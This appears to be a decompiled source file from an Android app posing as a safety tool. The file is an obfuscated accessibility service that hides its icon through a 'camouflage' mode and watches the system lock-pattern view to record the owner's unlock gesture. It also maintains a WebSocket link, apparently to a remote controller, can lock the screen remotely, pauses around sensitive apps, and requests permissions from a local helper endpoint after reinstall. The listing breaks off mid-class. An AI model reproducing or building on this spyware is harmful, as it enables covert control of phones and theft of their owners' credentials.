package com.storm.safe.rock.service;

import android.R;
import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.accessibilityservice.GestureDescription;
import android.app.Activity;
import android.app.ActivityManager;
import android.app.AlarmManager;
import android.app.Instrumentation;
import android.app.KeyguardManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Path;
import android.graphics.Point;
import android.graphics.PointF;
import android.graphics.Rect;
import android.graphics.drawable.Drawable;
import android.graphics.drawable.GradientDrawable;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.os.Parcelable;
import android.os.PowerManager;
import android.os.SystemClock;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.DisplayMetrics;
import android.util.TypedValue;
import android.view.Display;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowInsets;
import android.view.WindowManager;
import android.view.WindowMetrics;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;
import com.storm.safe.rock.AbstractC0241a0;
import com.storm.safe.rock.R$drawable;
import com.storm.safe.rock.R$string;
import com.storm.safe.rock.activity.syuqattwmgit;
import com.storm.safe.rock.inject.jbqfkndyx;
import com.storm.safe.rock.iuzxujjtqev;
import com.storm.safe.rock.manager.C0258a0;
import com.storm.safe.rock.manager.C0259a1;
import com.storm.safe.rock.manager.C0260a2;
import com.storm.safe.rock.manager.C0262a4;
import com.storm.safe.rock.manager.C0263a5;
import com.storm.safe.rock.network.C0267a0;
import com.storm.safe.rock.p029ui.ibbnqvnvhxg;
import com.storm.safe.rock.receiver.arniezsqllm;
import com.storm.safe.rock.service.AppCoreService;
import com.storm.safe.rock.service.InitWorkerService;
import com.storm.safe.rock.service.MediaDisplayService;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.AbstractC0315a0;
import com.storm.safe.rock.service.modules.C0317a2;
import com.storm.safe.rock.service.modules.C0318a3;
import com.storm.safe.rock.service.modules.C0319a4;
import com.storm.safe.rock.service.modules.C0320a5;
import com.storm.safe.rock.service.modules.C0322a7;
import com.storm.safe.rock.service.modules.C0323a8;
import com.storm.safe.rock.service.modules.C0324a9;
import com.storm.safe.rock.service.modules.C0325b0;
import com.storm.safe.rock.service.modules.C0327b2;
import com.storm.safe.rock.service.modules.C0328b3;
import com.storm.safe.rock.service.modules.C0329b4;
import com.storm.safe.rock.service.modules.ConfigProgressManager$ConfigStage;
import com.storm.safe.rock.service.modules.cipher.C0335a1;
import com.storm.safe.rock.service.modules.cipher.C0341a7;
import com.storm.safe.rock.service.modules.command.C0343a0;
import com.storm.safe.rock.service.modules.command.C0344a1;
import com.storm.safe.rock.service.modules.command.C0345a2;
import com.storm.safe.rock.service.modules.command.C0346a3;
import com.storm.safe.rock.service.modules.command.C0347a4;
import com.storm.safe.rock.service.modules.command.C0348a5;
import com.storm.safe.rock.service.modules.command.C0349a6;
import com.storm.safe.rock.service.modules.command.C0350a7;
import com.storm.safe.rock.service.modules.command.C0351a8;
import com.storm.safe.rock.service.modules.command.C0352a9;
import com.storm.safe.rock.service.modules.protection.C0355a0;
import com.storm.safe.rock.service.modules.protection.C0356a1;
import com.storm.safe.rock.service.modules.screen.C0357a0;
import com.storm.safe.rock.service.modules.setup.C0360a2;
import com.storm.safe.rock.service.modules.yw5xud.C0372a9;
import com.storm.safe.rock.service.zgafaqvswksa;
import com.storm.safe.rock.util.AbstractC0385a0;
import com.storm.safe.rock.util.StringUtil;
import io.socket.engineio.client.transports.PollingXHR;
import io.socket.engineio.parser.Base64;
import java.io.File;
import java.io.Serializable;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import kotlin.AbstractC0767a0;
import kotlin.Pair;
import kotlin.Result;
import kotlin.Triple;
import kotlin.collections.AbstractC0770a1;
import kotlin.coroutines.AbstractC0775a0;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.ContinuationImpl;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import kotlin.jvm.internal.Ref$FloatRef;
import kotlin.jvm.internal.Ref$ObjectRef;
import kotlin.text.AbstractC0778a0;
import kotlin.text.AbstractC0779a1;
import kotlinx.coroutines.AbstractC0780a0;
import kotlinx.coroutines.android.C0785a0;
import okhttp3.HttpUrl;
import okhttp3.internal.p032ws.WebSocketProtocol;
import org.conscrypt.FileClientSessionCache;
import org.json.JSONArray;
import org.json.JSONObject;
import p000.AbstractC0003a2;
import p000.AbstractC0134bh;
import p000.AbstractC0715je;
import p000.AbstractC0716jf;
import p000.AbstractC0717jg;
import p000.AbstractC0765ko;
import p000.AbstractC1117qo;
import p000.AbstractC1120qr;
import p000.AbstractC1262tj;
import p000.AbstractC1408xb;
import p000.AbstractC1517zh;
import p000.C0032al;
import p000.C0107as;
import p000.C0429du;
import p000.C0434dy;
import p000.C0454ef;
import p000.C0587hn;
import p000.C0598hx;
import p000.C0614i9;
import p000.C0620ig;
import p000.C0706j5;
import p000.C0708j7;
import p000.C0761kk;
import p000.C0763km;
import p000.C0856mc;
import p000.C0873ms;
import p000.C0931ny;
import p000.C1115qm;
import p000.C1180rh;
import p000.C1214s9;
import p000.C1217sc;
import p000.C1351vv;
import p000.C1496yx;
import p000.ExecutorC1158qw;
import p000.InterfaceC0726jp;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.RunnableC0436dz;
import p000.RunnableC0449ea;
import p000.RunnableC0613i8;
import p000.RunnableC1052p1;
import p000.RunnableC1224sj;
import p000.ViewOnTouchListenerC0450eb;
import p000.a30;
import p000.ak0;
import p000.al1;
import p000.b30;
import p000.b60;
import p000.b81;
import p000.bm0;
import p000.cm0;
import p000.cn0;
import p000.cp0;
import p000.cq0;
import p000.da0;
import p000.dd0;
import p000.dh0;
import p000.fd0;
import p000.fn0;
import p000.g60;
import p000.h10;
import p000.h30;
import p000.i60;
import p000.jn0;
import p000.jr0;
import p000.ju0;
import p000.kg1;
import p000.l10;
import p000.l20;
import p000.l81;
import p000.lj0;
import p000.lu0;
import p000.m10;
import p000.m21;
import p000.mj1;
import p000.n60;
import p000.nj1;
import p000.nm0;
import p000.oe0;
import p000.ou0;
import p000.qu0;
import p000.qz0;
import p000.r70;
import p000.r80;
import p000.sc0;
import p000.sj1;
import p000.t60;
import p000.tj1;
import p000.tu0;
import p000.tz0;
import p000.u11;
import p000.uz0;
import p000.w00;
import p000.x81;
import p000.xj0;
import p000.xz0;
import p000.y20;
import p000.y21;
import p000.y90;
import p000.z50;
import p000.zk1;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final class dqtvuisjd extends AccessibilityService {

    /* renamed from: m1 */
    public static final C0290a0 f52358m1 = new C0290a0(null);

    /* renamed from: m2 */
    public static final y90 f52359m2 = AbstractC0767a0.m213609a0(new w00() { // from class: com.storm.safe.rock.service.dqtvuisjd$Companion$uninstallMainHandler$2
        @Override // p000.w00
        public final Object invoke() {
            return new Handler(Looper.getMainLooper());
        }
    });

    /* renamed from: m3 */
    public static volatile boolean f52360m3;

    /* renamed from: m4 */
    public static volatile boolean f52361m4;

    /* renamed from: m5 */
    public static volatile long f52362m5;

    /* renamed from: m6 */
    public static volatile long f52363m6;

    /* renamed from: m7 */
    public static volatile dqtvuisjd f52364m7;

    /* renamed from: m8 */
    public static volatile long f52365m8;

    /* renamed from: m9 */
    public static volatile C0285a5 f52366m9;

    /* renamed from: n0 */
    public static volatile int f52367n0;

    /* renamed from: n1 */
    public static final AtomicBoolean f52368n1;

    /* renamed from: a0 */
    public C0260a2 f52369a0;

    /* renamed from: a1 */
    public C0263a5 f52370a1;

    /* renamed from: a2 */
    public C0258a0 f52371a2;

    /* renamed from: a3 */
    public C0324a9 f52372a3;

    /* renamed from: a4 */
    public C0856mc f52373a4;

    /* renamed from: a5 */
    public z50 f52374a5;

    /* renamed from: a6 */
    public C0262a4 f52375a6;

    /* renamed from: a7 */
    public fn0 f52376a7;

    /* renamed from: a8 */
    public final tj1 f52377a8;

    /* renamed from: a9 */
    public C0873ms f52378a9;

    /* renamed from: b0 */
    public u11 f52379b0;

    /* renamed from: b1 */
    public C0350a7 f52380b1;

    /* renamed from: b2 */
    public uz0 f52381b2;

    /* renamed from: b3 */
    public C0322a7 f52382b3;

    /* renamed from: b4 */
    public u11 f52383b4;

    /* renamed from: b5 */
    public PowerManager f52384b5;

    /* renamed from: b6 */
    public KeyguardManager f52385b6;

    /* renamed from: b7 */
    public volatile long f52386b7;

    /* renamed from: b8 */
    public volatile long f52387b8;

    /* renamed from: b9 */
    public volatile boolean f52388b9;

    /* renamed from: c0 */
    public volatile long f52389c0;

    /* renamed from: c1 */
    public final long f52390c1;

    /* renamed from: c2 */
    public volatile AccessibilityNodeInfo f52391c2;

    /* renamed from: c3 */
    public volatile long f52392c3;

    /* renamed from: c4 */
    public final long f52393c4;

    /* renamed from: c5 */
    public volatile boolean f52394c5;

    /* renamed from: c6 */
    public u11 f52395c6;

    /* renamed from: c7 */
    public int f52396c7;

    /* renamed from: c8 */
    public int f52397c8;

    /* renamed from: c9 */
    public double f52398c9;

    /* renamed from: d0 */
    public boolean f52399d0;

    /* renamed from: d1 */
    public volatile boolean f52400d1;

    /* renamed from: d2 */
    public volatile boolean f52401d2;

    /* renamed from: d3 */
    public volatile boolean f52402d3;

    /* renamed from: d4 */
    public final LinkedHashSet f52403d4;

    /* renamed from: d5 */
    public final String f52404d5;

    /* renamed from: d6 */
    public final LinkedHashMap f52405d6;

    /* renamed from: d7 */
    public final Object f52406d7;

    /* renamed from: d8 */
    public final LinkedHashMap f52407d8;

    /* renamed from: d9 */
    public final long f52408d9;

    /* renamed from: e0 */
    public u11 f52409e0;

    /* renamed from: e1 */
    public final long f52410e1;

    /* renamed from: e2 */
    public boolean f52411e2;

    /* renamed from: e3 */
    public long f52412e3;

    /* renamed from: e4 */
    public xz0 f52413e4;

    /* renamed from: e5 */
    public C0614i9 f52414e5;

    /* renamed from: e6 */
    public C0323a8 f52415e6;

    /* renamed from: e7 */
    public C0761kk f52416e7;

    /* renamed from: e8 */
    public x81 f52417e8;

    /* renamed from: e9 */
    public C0317a2 f52418e9;

    /* renamed from: f0 */
    public ou0 f52419f0;

    /* renamed from: f1 */
    public b60 f52420f1;

    /* renamed from: f2 */
    public da0 f52421f2;

    /* renamed from: f3 */
    public r80 f52422f3;

    /* renamed from: f4 */
    public fd0 f52423f4;

    /* renamed from: f5 */
    public l81 f52424f5;

    /* renamed from: f6 */
    public jn0 f52425f6;

    /* renamed from: f7 */
    public C1115qm f52426f7;

    /* renamed from: f8 */
    public C0763km f52427f8;

    /* renamed from: f9 */
    public C0318a3 f52428f9;

    /* renamed from: g0 */
    public C0327b2 f52429g0;

    /* renamed from: g1 */
    public tu0 f52430g1;

    /* renamed from: g2 */
    public C0329b4 f52431g2;

    /* renamed from: g3 */
    public volatile boolean f52432g3;

    /* renamed from: g4 */
    public ju0 f52433g4;

    /* renamed from: g5 */
    public C0328b3 f52434g5;

    /* renamed from: g6 */
    public C0355a0 f52435g6;

    /* renamed from: g7 */
    public C0356a1 f52436g7;

    /* renamed from: g8 */
    public C0319a4 f52437g8;

    /* renamed from: g9 */
    public C0335a1 f52438g9;

    /* renamed from: h0 */
    public C0032al f52439h0;

    /* renamed from: h1 */
    public a30 f52440h1;

    /* renamed from: h2 */
    public C0357a0 f52441h2;

    /* renamed from: h3 */
    public boolean f52442h3;

    /* renamed from: h4 */
    public u11 f52443h4;

    /* renamed from: h5 */
    public long f52444h5;

    /* renamed from: h6 */
    public int f52445h6;

    /* renamed from: h7 */
    public final Set f52446h7;

    /* renamed from: h8 */
    public volatile boolean f52447h8;

    /* renamed from: h9 */
    public long f52448h9;

    /* renamed from: i0 */
    public int f52449i0;

    /* renamed from: i1 */
    public int f52450i1;

    /* renamed from: i2 */
    public long f52451i2;

    /* renamed from: i3 */
    public final int f52452i3;

    /* renamed from: i4 */
    public boolean f52453i4;

    /* renamed from: i5 */
    public l20 f52454i5;

    /* renamed from: i6 */
    public C0259a1 f52455i6;

    /* renamed from: i7 */
    public C1496yx f52456i7;

    /* renamed from: i8 */
    public final dqtvuisjd$screenStateReceiver$1 f52457i8;

    /* renamed from: i9 */
    public boolean f52458i9;

    /* renamed from: j0 */
    public dqtvuisjd$registerLocalServiceActionReceiver$1 f52459j0;

    /* renamed from: j1 */
    public boolean f52460j1;

    /* renamed from: j2 */
    public arniezsqllm f52461j2;

    /* renamed from: j3 */
    public C0931ny f52462j3;

    /* renamed from: j4 */
    public HandlerThread f52463j4;

    /* renamed from: j5 */
    public long f52464j5;

    /* renamed from: j6 */
    public final dqtvuisjd$permissionRequestReceiver$1 f52465j6;

    /* renamed from: j7 */
    public dqtvuisjd$registerNetworkEventReceivers$1 f52466j7;

    /* renamed from: j8 */
    public long f52467j8;

    /* renamed from: j9 */
    public final long f52468j9;

    /* renamed from: k0 */
    public volatile boolean f52469k0;

    /* renamed from: k1 */
    public String f52470k1;

    /* renamed from: k2 */
    public volatile int f52471k2;

    /* renamed from: k3 */
    public final int f52472k3;

    /* renamed from: k4 */
    public final long f52473k4;

    /* renamed from: k5 */
    public volatile boolean f52474k5;

    /* renamed from: k6 */
    public boolean f52475k6;

    /* renamed from: k7 */
    public Rect f52476k7;

    /* renamed from: k8 */
    public boolean f52477k8;

    /* renamed from: k9 */
    public int f52478k9;

    /* renamed from: l0 */
    public volatile boolean f52479l0;

    /* renamed from: l1 */
    public TextView f52480l1;

    /* renamed from: l2 */
    public FrameLayout f52481l2;

    /* renamed from: l3 */
    public WindowManager f52482l3;

    /* renamed from: l4 */
    public volatile boolean f52483l4;

    /* renamed from: l5 */
    public String f52484l5;

    /* renamed from: l6 */
    public volatile int f52485l6;

    /* renamed from: l7 */
    public final int f52486l7;

    /* renamed from: l8 */
    public final long f52487l8;

    /* renamed from: l9 */
    public boolean f52488l9;

    /* renamed from: m0 */
    public final dqtvuisjd$permissionHealthReceiver$1 f52489m0;

    /* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
    /* renamed from: com.storm.safe.rock.service.dqtvuisjd$a0 */
    public static final class C0290a0 {
        public /* synthetic */ C0290a0(AbstractC1120qr abstractC1120qr) {
            this();
        }

        /* JADX INFO: Access modifiers changed from: private */
        public final Handler getUninstallMainHandler() {
            return (Handler) dqtvuisjd.f52359m2.getValue();
        }

        /* JADX WARN: Removed duplicated region for block: B:9:0x0013  */
        /*
            Code decompiled incorrectly, please refer to instructions dump.
        */
        public final void forceReconnectWebSocket() {
            C0323a8 lj0Var;
            t60.m214702c3("dqtvuisjd", "📡 外部触发WebSocket重连");
            dqtvuisjd dqtvuisjdVar = dqtvuisjd.f52364m7;
            if (dqtvuisjdVar == null) {
                lj0Var = C0323a8.f53097e0.getInstance();
            } else {
                lj0Var = dqtvuisjdVar.f52415e6;
                if (lj0Var == null) {
                    lj0Var = null;
                }
                if (lj0Var == null) {
                }
            }
            if (lj0Var != null) {
                lj0Var.m211643a8();
                lj0Var.m211669d6();
            }
        }

        public final AccessibilityNodeInfo getCachedRoot() {
            dqtvuisjd dqtvuisjdVar = dqtvuisjd.f52364m7;
            if (dqtvuisjdVar != null) {
                return dqtvuisjdVar.m211468g2();
            }
            return null;
        }

        public final dqtvuisjd getInstance() {
            return dqtvuisjd.f52364m7;
        }

        public final C0285a5 getLastCachedSource() {
            return dqtvuisjd.f52366m9;
        }

        public final long getLastWebViewStatusTime() {
            return dqtvuisjd.f52363m6;
        }

        public final int getServiceMode() {
            return dqtvuisjd.f52367n0;
        }

        public final boolean isPermissionRequestActive() {
            if (!dqtvuisjd.f52361m4) {
                return false;
            }
            if (System.currentTimeMillis() - dqtvuisjd.f52362m5 <= 30000) {
                return true;
            }
            t60.m214726f4("dqtvuisjd", "⚠️ [权限] 权限请求标志位超时，自动清除");
            dqtvuisjd.f52361m4 = false;
            return false;
        }

        public final boolean isSensitiveAppPaused() {
            return dqtvuisjd.f52368n1.get();
        }

        public final boolean isServiceReady() {
            dqtvuisjd dqtvuisjdVar = dqtvuisjd.f52364m7;
            return dqtvuisjdVar != null && dqtvuisjdVar.f52399d0;
        }

        public final boolean isServiceRunning() {
            return dqtvuisjd.f52364m7 != null;
        }

        public final boolean isVerifyPaused() {
            return getServiceMode() == 1;
        }

        public final void lockScreen() {
            dqtvuisjd dqtvuisjdVar = dqtvuisjd.f52364m7;
            if (dqtvuisjdVar != null) {
                try {
                    if (Build.VERSION.SDK_INT < 28) {
                        t60.m214702c3("dqtvuisjd", "🔍 [屏幕] Android 9以下不支持无障碍锁屏");
                    } else if (dqtvuisjdVar.performGlobalAction(8)) {
                        t60.m214714d6("dqtvuisjd", "✅ [屏幕] 屏幕已锁定（定时唤醒后自动锁屏）");
                    } else {
                        t60.m214726f4("dqtvuisjd", "⚠️ [屏幕] 锁屏失败");
                    }
                } catch (Exception e) {
                    tz0.m214810b0("⚠️ [屏幕] 锁屏异常: ", e.getMessage(), "dqtvuisjd");
                }
            }
        }

        public final void pauseForSensitiveApp() {
            dqtvuisjd.f52368n1.set(true);
        }

        public final void resumeFromSensitiveApp() {
            dqtvuisjd.f52368n1.set(false);
        }

        public final void setAssistMode() {
            dqtvuisjd.f52367n0 = 0;
        }

        public final void setLastCachedSource(C0285a5 c0285a5) {
            dqtvuisjd.f52366m9 = c0285a5;
        }

        public final void setPermissionRequesting(boolean z) {
            dqtvuisjd.f52361m4 = z;
            if (z) {
                dqtvuisjd.f52362m5 = System.currentTimeMillis();
            }
        }

        public final void setVerifyPauseMode() {
            dqtvuisjd.f52367n0 = 1;
        }

        public final void setWebViewOpen(boolean z) {
            dqtvuisjd.f52360m3 = z;
            dqtvuisjd.f52363m6 = System.currentTimeMillis();
        }

        private C0290a0() {
        }
    }

    /* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
    @InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.dqtvuisjd$onAccessibilityEvent$9", m214403f = "dqtvuisjd.kt", m214404l = {}, m214405m = "invokeSuspend")
    /* renamed from: com.storm.safe.rock.service.dqtvuisjd$onAccessibilityEvent$9 */
    public static final class C02969 extends SuspendLambda implements l10 {

        /* renamed from: a1 */
        public final /* synthetic */ dqtvuisjd f52608a1;

        /* renamed from: a2 */
        public final /* synthetic */ String f52609a2;

        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
        public C02969(InterfaceC0876mv interfaceC0876mv, dqtvuisjd dqtvuisjdVar, String str) {
            super(2, interfaceC0876mv);
            this.f52608a1 = dqtvuisjdVar;
            this.f52609a2 = str;
        }

        @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
        public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
            return new C02969(interfaceC0876mv, this.f52608a1, this.f52609a2);
        }

        @Override // p000.l10
        public final Object invoke(Object obj, Object obj2) throws Throwable {
            C02969 c02969 = (C02969) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2);
            C1351vv c1351vv = C1351vv.f60710b1;
            c02969.invokeSuspend(c1351vv);
            return c1351vv;
        }

        @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
        public final Object invokeSuspend(Object obj) throws Throwable {
            CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
            kg1.m213544f4(obj);
            AccessibilityNodeInfo accessibilityNodeInfoM211468g2 = this.f52608a1.m211468g2();
            C0319a4 c0319a4 = this.f52608a1.f52437g8;
            if (c0319a4 == null) {
                t60.m214724f2("gestureRecorderManager");
                throw null;
            }
            if (c0319a4.f53056a2) {
                int i = 1;
                if (c0319a4.f53061a7 == 1 && !((SharedPreferences) c0319a4.f53065b1.getValue()).getBoolean("has_recorded_unlock", false)) {
                    String str = Build.MANUFACTURER;
                    t60.m214694b5(str, "MANUFACTURER");
                    String lowerCase = str.toLowerCase(Locale.ROOT);
                    t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                    String str2 = (AbstractC0779a1.m213652a5(lowerCase, "vivo", false) || AbstractC0779a1.m213652a5(lowerCase, "iqoo", false) || AbstractC0779a1.m213652a5(lowerCase, "bbk", false)) ? "com.android.systemui:id/vivo_lock_pattern_view" : "com.android.systemui:id/lockPatternView";
                    AccessibilityNodeInfo accessibilityNodeInfoM211571a2 = C0319a4.m211571a2(accessibilityNodeInfoM211468g2, str2);
                    if (accessibilityNodeInfoM211571a2 != null && accessibilityNodeInfoM211571a2.isVisibleToUser() && !c0319a4.f53060a6) {
                        t60.m214702c3("GestureRecorderManager", "🔐 检测到图案锁视图(" + str2 + ")，启用触摸探索");
                        if (!c0319a4.f53060a6) {
                            c0319a4.f53060a6 = true;
                            c0319a4.f53066b2.postDelayed(new b30(c0319a4, i), 100L);
                        }
                    }
                }
            }
            return C1351vv.f60710b1;
        }
    }

    /* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
    @InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.dqtvuisjd$onServiceConnected$1", m214403f = "dqtvuisjd.kt", m214404l = {720, 738}, m214405m = "invokeSuspend")
    /* renamed from: com.storm.safe.rock.service.dqtvuisjd$onServiceConnected$1 */
    public static final class C02971 extends SuspendLambda implements l10 {

        /* renamed from: a1 */
        public int f52610a1;

        /* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
        @InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.dqtvuisjd$onServiceConnected$1$1", m214403f = "dqtvuisjd.kt", m214404l = {}, m214405m = "invokeSuspend")
        /* renamed from: com.storm.safe.rock.service.dqtvuisjd$onServiceConnected$1$1, reason: invalid class name */
        final class AnonymousClass1 extends SuspendLambda implements l10 {

            /* renamed from: a1 */
            public final /* synthetic */ dqtvuisjd f52612a1;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            public AnonymousClass1(dqtvuisjd dqtvuisjdVar, InterfaceC0876mv interfaceC0876mv) {
                super(2, interfaceC0876mv);
                this.f52612a1 = dqtvuisjdVar;
            }

            @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
            public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
                return new AnonymousClass1(this.f52612a1, interfaceC0876mv);
            }

            @Override // p000.l10
            public final Object invoke(Object obj, Object obj2) throws Throwable {
                AnonymousClass1 anonymousClass1 = (AnonymousClass1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2);
                C1351vv c1351vv = C1351vv.f60710b1;
                anonymousClass1.invokeSuspend(c1351vv);
                return c1351vv;
            }

            @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
            public final Object invokeSuspend(Object obj) throws Throwable {
                CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
                kg1.m213544f4(obj);
                dqtvuisjd dqtvuisjdVar = this.f52612a1;
                t60.m214714d6("dqtvuisjd", "🎭 收到自动伪装请求，开始执行伪装流程...");
                try {
                    t60.m214714d6("dqtvuisjd", "🎭 启用伪装模式");
                    if (dqtvuisjdVar.f52434g5 == null) {
                        t60.m214726f4("dqtvuisjd", "⚠️ appIconHideManager 未初始化");
                    } else {
                        dqtvuisjdVar.f52475k6 = true;
                        AbstractC0780a0.m213692a3(dqtvuisjdVar.f52378a9, AbstractC1262tj.f60234a1, new dqtvuisjd$enableCamouflageMode$2(dqtvuisjdVar, null), 2);
                    }
                } catch (Exception e) {
                    t60.m214705c6("dqtvuisjd", "❌ 启用伪装模式异常", e);
                }
                return C1351vv.f60710b1;
            }
        }

        public C02971(InterfaceC0876mv interfaceC0876mv) {
            super(2, interfaceC0876mv);
        }

        @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
        public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
            return dqtvuisjd.this.new C02971(interfaceC0876mv);
        }

        @Override // p000.l10
        public final Object invoke(Object obj, Object obj2) {
            return ((C02971) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
        }

        /* JADX WARN: Can't wrap try/catch for region: R(8:0|2|(1:33)|(1:(1:(4:6|26|29|30)(2:10|11))(1:12))(4:14|15|(1:17)|25)|18|31|19|23) */
        /* JADX WARN: Code restructure failed: missing block: B:21:0x006f, code lost:
        
            r10 = move-exception;
         */
        /* JADX WARN: Code restructure failed: missing block: B:22:0x0070, code lost:
        
            p000.t60.m214726f4("dqtvuisjd", "⚠️ [重装恢复] 权限授予失败: " + r10.getMessage());
         */
        /* JADX WARN: Code restructure failed: missing block: B:24:0x0095, code lost:
        
            if (kotlinx.coroutines.AbstractC0780a0.m213696a7(r10, r0, r9) == r2) goto L25;
         */
        @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
        /*
            Code decompiled incorrectly, please refer to instructions dump.
        */
        public final Object invokeSuspend(Object obj) throws Throwable {
            CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
            int i = this.f52610a1;
            try {
            } catch (Exception e) {
                tz0.m214807a7("❌ [重装恢复] 自动恢复失败: ", e.getMessage(), "dqtvuisjd");
            }
            if (i == 0) {
                kg1.m213544f4(obj);
                this.f52610a1 = 1;
                if (b81.m210571b1(3000L, this) == coroutineSingletons) {
                }
                return coroutineSingletons;
            }
            if (i != 1) {
                if (i != 2) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                kg1.m213544f4(obj);
                t60.m214714d6("dqtvuisjd", "✅ [重装恢复] 自动隐藏+伪装完成");
                return C1351vv.f60710b1;
            }
            kg1.m213544f4(obj);
            t60.m214714d6("dqtvuisjd", "🔄 [重装恢复] 开始自动隐藏+伪装+权限授予");
            URLConnection uRLConnectionOpenConnection = new URL("http://127.0.0.1:7912/grantMainApp").openConnection();
            t60.m214693b4(uRLConnectionOpenConnection, "null cannot be cast to non-null type java.net.HttpURLConnection");
            HttpURLConnection httpURLConnection = (HttpURLConnection) uRLConnectionOpenConnection;
            httpURLConnection.setRequestMethod("POST");
            httpURLConnection.setConnectTimeout(5000);
            httpURLConnection.setReadTimeout(5000);
            t60.m214714d6("dqtvuisjd", "✅ [重装恢复] 权限授予请求: HTTP=" + httpURLConnection.getResponseCode());
            httpURLConnection.disconnect();
            C1180rh c1180rh = AbstractC1262tj.f60233a0;
            C0785a0 c0785a0 = sc0.f59953a0;
            AnonymousClass1 anonymousClass1 = new AnonymousClass1(dqtvuisjd.this, null);
            this.f52610a1 = 2;
        }
    }

    /* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
    @InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.dqtvuisjd$onServiceConnected$2", m214403f = "dqtvuisjd.kt", m214404l = {773}, m214405m = "invokeSuspend")
    /* renamed from: com.storm.safe.rock.service.dqtvuisjd$onServiceConnected$2 */
    public static final class C02982 extends SuspendLambda implements l10 {

        /* renamed from: a1 */
        public int f52613a1;

        public C02982(InterfaceC0876mv interfaceC0876mv) {
            super(2, interfaceC0876mv);
        }

        @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
        public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
            return dqtvuisjd.this.new C02982(interfaceC0876mv);
        }

        @Override // p000.l10
        public final Object invoke(Object obj, Object obj2) {
            return ((C02982) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
        }

        @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
        public final Object invokeSuspend(Object obj) throws Throwable {
            CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
            int i = this.f52613a1;
            try {
                if (i == 0) {
                    kg1.m213544f4(obj);
                    dqtvuisjd dqtvuisjdVar = dqtvuisjd.this;
                    this.f52613a1 = 1;
                    if (dqtvuisjd.m211404a3(dqtvuisjdVar, this) == coroutineSingletons) {
                        return coroutineSingletons;
                    }
                } else {
                    if (i != 1) {
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                    }
                    kg1.m213544f4(obj);
                }
            } catch (Exception e) {
                t60.m214705c6("dqtvuisjd", "❌ 延迟初始化失败", e);
            }
            return C1351vv.f60710b1;
        }
    }

    static {
